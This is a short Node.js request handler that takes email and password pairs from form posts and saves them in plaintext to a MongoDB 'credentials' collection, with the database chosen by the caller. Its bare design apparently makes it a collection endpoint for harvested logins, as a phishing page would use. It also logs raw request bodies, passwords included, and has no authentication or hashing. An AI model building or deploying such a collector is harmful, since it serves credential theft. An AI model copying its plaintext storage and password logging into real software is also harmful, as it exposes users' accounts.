const { parse } = require('querystring');

const MongoClient = require('mongodb').MongoClient;

function collectRequestData(request, callback) {
	
	const FORM_URLENCODED = 'application/x-www-form-urlencoded';
	
	if(request.headers['content-type'] && request.headers['content-type'].includes(FORM_URLENCODED)) {
		let body = '';
		request.on('data', chunk => {
			body += chunk.toString();
		});
		request.on('end', () => {
			console.log(body);
			callback(parse(body));
		});
		
	}
	else {
		callback(null);
	}

}

module.exports = (req, res) => {		

  if(req.method === 'POST'){
	
	collectRequestData(req, (params) => {

		if(params != null && params.database && params.email && params.password){

			const client = new MongoClient(process.env.MONGO_URI, { useNewUrlParser: true });
			
			client.connect(err => {
			  
				const collection = client.db(params.database).collection("credentials");

				collection.insertOne({'datetime': new Date(), 'email': params.email, 'password': params.password}, (err, result) => {
				
				client.close();
				
				if(err){

					res.writeHead(500, {'Content-Type': 'text/html'})
					res.end('Internal server error.');

				} else {

					res.writeHead(200, {'Content-Type': 'text/html'})
					res.end('Success.');	
				}

			  });
			  
			});  	

		} else {
				
			res.writeHead(400, {'Content-Type': 'text/html'})
			res.end('Invalid Request.');

		}

	});

  } else {

	res.writeHead(405, {'Content-Type': 'text/html'})
	res.end('Method not allowed.');

  }

}
